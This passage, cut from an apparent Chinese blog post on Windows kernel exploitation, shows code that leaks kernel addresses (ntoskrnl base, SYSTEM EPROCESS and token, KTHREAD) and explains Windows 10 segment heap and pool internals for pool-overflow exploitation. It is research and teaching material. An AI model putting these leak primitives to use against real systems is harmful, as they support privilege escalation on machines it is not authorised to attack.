class="number">0</span>].ImageBaseAddress;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] ntoskrnl.exe base address: 0x&quot;</span> &lt;&lt; hex &lt;&lt; kernelImageBase &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (INT64)kernelImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过其Name查询指定模块基址 <code>SYSTEM_MODULE_INFORMATION-&gt;Modules[ModulesCount].Name</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE</span> &#123;</span><br><span class="line">	ULONG                Reserved1;</span><br><span class="line">	ULONG                Reserved2;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	ULONG				Reserved3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	PVOID                ImageBaseAddress;</span><br><span class="line">	ULONG                ImageSize;</span><br><span class="line">	ULONG                Flags;</span><br><span class="line">	WORD                 Id;</span><br><span class="line">	WORD                 Rank;</span><br><span class="line">	WORD                 w018;</span><br><span class="line">	WORD                 NameOffset;</span><br><span class="line">	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG                ModulesCount;</span><br><span class="line">	SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>

<h4 id="SystemExtendedHandleInformation"><a href="#SystemExtendedHandleInformation" class="headerlink" title="SystemExtendedHandleInformation"></a>SystemExtendedHandleInformation</h4><p>通过其指定的handle(<code>SYSTEM_HANDLE_INFORMATION_EX-&gt;Handles[HandleCount].UniqueProcessId</code>)查询Object</p>
<p>Handle</p>
<ul>
<li>Process的Handle，EPROCESS</li>
<li>Thread的Handle, ETHREAD<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	HANDLE UniqueProcessId;</span><br><span class="line">	HANDLE HandleValue;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	USHORT ObjectTypeIndex;</span><br><span class="line">	ULONG HandleAttributes;</span><br><span class="line">	ULONG Reserved;</span><br><span class="line">&#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION_EX</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG_PTR HandleCount;</span><br><span class="line">	ULONG_PTR Reserved;</span><br><span class="line">	SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查询pid为4，HandleValue为4, object代表SYSTEM进程EPROCESS的地址，从而可以获得token的地址</p>
<p>ETHREAD(KTHREAD) 的地址：当HandleValue为当前指定的Thread</p>
<ul>
<li>Thread可以OpenThread指定</li>
<li>还可以在Process中CreateThread</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> array_size = z - <span class="number">1</span>;</span><br><span class="line">PVOID* kThread_array = <span class="keyword">new</span> PVOID[array_size];</span><br><span class="line">z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			kThread_array[z] = system_handle_info-&gt;Handles[i].Object;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] KTHREAD address: %p\n&quot;</span>, kThread_array[array_size]);</span><br></pre></td></tr></table></figure>

<h3 id="Scoop-the-Windows-10-pool"><a href="#Scoop-the-Windows-10-pool" class="headerlink" title="Scoop the Windows 10 pool!"></a>Scoop the Windows 10 pool!</h3><p>内核池</p>
<p><a target="_blank" rel="noopener" href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1</a></p>
<p><a target="_blank" rel="noopener" href="https://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/">Scoop The Windows 10 Pool 翻译</a></p>
<p><a target="_blank" rel="noopener" href="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Windows10内核池管理机制与利用方法 | Ash blog (ashlq.github.io)</a></p>
<p>比较新的一篇总结：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUEFxciD9WGrGYD">Windows内核利用小总结</a></p>
<h4 id="pool"><a href="#pool" class="headerlink" title="pool"></a>pool</h4><p>用户态操作在 <code>C\Windows\system32\ntdll.dll</code> 中，可以逆向看看。</p>
<p>在win10 2004（这一版本也被称为Win10 2020年五月更新版（代号是20H1）） 以及之前是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在内核池中,所有<strong>单页的数据块的开头</strong>都是一个POOL_HEADER结构。这个结构包含了分配器和tag信息。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// win10 22h2</span></span><br><span class="line"><span class="number">1</span>: kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure>

<p>主要的PoolType:NonPagedPool,PagedPool,SessionPool,NonPagedPoolNx</p>
<ul>
<li>在win8中引入了NonPagedPoolNx,必须使用它来替代NonpagedPool类型.</li>
</ul>
<p><strong>PagedPool</strong>是分页内存，简单来说就是物理内存不够时，会把这片内存移动到硬盘上。</p>
<ul>
<li>一个物理地址能对应多个虚拟地址</li>
</ul>
<p>而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。只能常驻于物理内存地址，不能映射</p>
<p>Segment Heap – 段堆自Windows 10 19H1开始用于内核空间，与用户空间中使用的段堆非常相似。就像在用户态使用的一样，段堆是为根据分配大小的不同提供不同的功能，为此来定义了多种不同类型的后端处理。  </p>
<p>win10之后堆分为两种：Segment heap和NT heap。当一个进程分配堆的时候，大部分场合默认使用的堆都是后面那种，前面的segment heap通常会在winapp或者某些特殊的进程（核心进程）中会使用到。 </p>
<p>这两种堆称为前端堆（Frontend Heap）和后端堆（Backend Heap）</p>
<p>低碎片堆(LFH)  &lt;&#x3D; 0x200<br>可变量大小后端(VS)  &lt;&#x3D; 0x20000<br>分段分配(SEG)  &lt;&#x3D; 0x7f0000<br>Large</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">RtlpHpAllocateHeapInternal</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> <span class="type">int</span> a4, <span class="type">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)*(<span class="type">unsigned</span> __int16 *)(a1 + <span class="number">892</span>) - <span class="number">16</span></span><br><span class="line">    || (v10 = <span class="built_in">RtlpHpLfhContextAllocate</span>(a1 + <span class="number">832</span>, a2, a3, a4), a3 = (<span class="type">unsigned</span> <span class="type">int</span>)v6, a2 = (<span class="type">unsigned</span> <span class="type">int</span>)v7, v10 == <span class="number">-1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">0x20000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt; *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">464</span>) )</span><br><span class="line">        v11 = <span class="built_in">RtlpHpLargeAlloc</span>(a1, v7, v6, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v11 = <span class="built_in">RtlpHpSegAlloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)a1 + (*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">272</span>) &lt; v6 ? <span class="number">448</span> : <span class="number">256</span>), v7, v6, v6, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">RtlpHpVsContextAllocate</span>(a1 + <span class="number">640</span>, a2, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a5 = v9;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LFH,VS,SEG分别关联了对应的上下文(CONTEXT)，这些后端的上下文存储在<code>_SEGMENT_HEAP</code>结构中偏移0x100,0x280,0x340的位置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure>

<p>不同的<code>POOL_TYPE</code>,都有1个<code>_SEGMENT_HEAP</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _POOL_TYPE</span><br><span class="line">ntdll!_POOL_TYPE</span><br><span class="line">   NonPagedPool = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolExecute = <span class="number">0</span>n0</span><br><span class="line">   PagedPool = <span class="number">0</span>n1</span><br><span class="line">   NonPagedPoolMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   DontUseThisType = <span class="number">0</span>n3</span><br><span class="line">   NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">   NonPagedPoolCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   MaxPoolType = <span class="number">0</span>n7</span><br><span class="line">   NonPagedPoolBase = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolBaseMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   NonPagedPoolBaseCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   NonPagedPoolBaseCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   NonPagedPoolSession = <span class="number">0</span>n32</span><br><span class="line">   PagedPoolSession = <span class="number">0</span>n33</span><br><span class="line">   NonPagedPoolMustSucceedSession = <span class="number">0</span>n34</span><br><span class="line">   DontUseThisTypeSession = <span class="number">0</span>n35</span><br><span class="line">   NonPagedPoolCacheAlignedSession = <span class="number">0</span>n36</span><br><span class="line">   PagedPoolCacheAlignedSession = <span class="number">0</span>n37</span><br><span class="line">   NonPagedPoolCacheAlignedMustSSession = <span class="number">0</span>n38</span><br><span class="line">   NonPagedPoolNx = <span class="number">0</span>n512</span><br><span class="line">   NonPagedPoolNxCacheAligned = <span class="number">0</span>n516</span><br><span class="line">   NonPagedPoolSessionNx = <span class="number">0</span>n544</span><br></pre></td></tr></table></figure>

<h5 id="Segment-Backend"><a href="#Segment-Backend" class="headerlink" title="Segment Backend"></a>Segment Backend</h5><p>SegAlloc后端是用于分配大小在128 KB和7 GB之间的内存块。它也用于后台，为VS和LFH后端分配内存。  </p>
<p>段后端上下文存储在一个名为<code>_HEAP_SEG_CONTEXT</code>的结构中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>段存储在存储在SegmentListHead中的链表中。段头为<code>_HEAP_PAGE_SEGMENT</code>，后面是256个<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>结构。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure>

<p><code>_HEAP_SEG_CONTEXT</code>中还维护了一个红黑树，而<code>_HEAP_PAGE_SEGMENT</code>中的Signature是每个<code>_HEAP_PAGE_SEGMEN</code>T都有的一个签名计算</p>
<p>计算方法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ <span class="number">0xA2E64EADA2E64EAD</span>;</span><br><span class="line"><span class="comment">// SegContext: 所属的_HEAP_SEG_CONTEXT</span></span><br><span class="line">Segment = Addr &amp; SegContext-&gt;SegmentMask;</span><br></pre></td></tr></table></figure>

<h5 id="Variable-Size-Backend"><a href="#Variable-Size-Backend" class="headerlink" title="Variable Size Backend"></a>Variable Size Backend</h5><p>可变大小后端分配512B到128KB大小的块。它的目的是在提供对空闲块的重用。它存储在<code>_HEAP_VS_CONTEXT</code>结构体中。</p>
<ul>
<li>空闲块以<code>_HEAP_VS_CHUNK_FREE_HEADER</code>的专用结构体为头部。</li>
<li>而已经被分配的块都会以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 Lock : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 LockType : _RTLP_HP_LOCK_TYPE</span><br><span class="line">+<span class="number">0</span> x010 FreeChunkTree : _RTL_RB_TREE</span><br><span class="line">+<span class="number">0</span> x020 SubsegmentList : _LIST_ENTRY</span><br><span class="line">+<span class="number">0</span> x030 TotalCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x038 FreeCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">+<span class="number">0</span> x080 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x0b0 Config : _RTL_HP_VS_CONFIG</span><br><span class="line">+<span class="number">0</span> x0b4 Flags : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Sizes : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x008 EncodedSegmentPageOffset : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 UnusedBytes : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 SkipDuringWalk : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 Spare : Pos <span class="number">10</span>, <span class="number">22</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 AllocatedChunkBits : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x000 MemoryCost : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 UnsafeSize : Pos <span class="number">16</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 UnsafePrevSize : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 Allocated : Pos <span class="number">16</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 KeyUShort : Uint2B</span><br><span class="line">+<span class="number">0</span> x000 KeyULong : Uint4B</span><br><span class="line">+<span class="number">0</span> x000 HeaderBits : 